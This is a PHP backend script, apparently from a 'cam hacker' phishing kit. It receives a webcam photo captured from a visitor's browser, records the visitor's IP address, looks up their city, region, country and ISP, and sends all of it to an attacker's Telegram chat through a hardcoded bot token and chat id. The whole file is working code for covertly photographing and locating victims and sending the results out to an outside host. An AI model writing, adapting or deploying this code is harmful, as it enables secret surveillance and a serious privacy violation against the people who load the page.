<?php
$data = json_decode(file_get_contents("php://input"), true);
$imageData = $data["image"];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");

$image = base64_decode(preg_replace('#^data:image/\\w+;base64,#i', '', $imageData));
file_put_contents("photo.jpg", $image);

$geo = json_decode(file_get_contents("http://ip-api.com/json/" . $ip));

$msg = "📸 Cam Hacker Alert!\n";
$msg .= "🕒 Time: $date\n";
$msg .= "🌐 IP: $ip\n";
$msg .= "📍 Location: {$geo->city}, {$geo->regionName}, {$geo->country}\n";
$msg .= "🛰 ISP: {$geo->isp}";

$token = "7480978370:AAFh8rnGTSwP7jp-yA9oFSEdrqyJYHRlILo";
$chat_id = "-1264568426";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));

$sendPhoto = curl_init("https://api.telegram.org/bot$token/sendPhoto");
curl_setopt($sendPhoto, CURLOPT_POST, 1);
curl_setopt($sendPhoto, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'photo' => new CURLFile(realpath("photo.jpg"))
]);
curl_exec($sendPhoto);
curl_close($sendPhoto);
?>
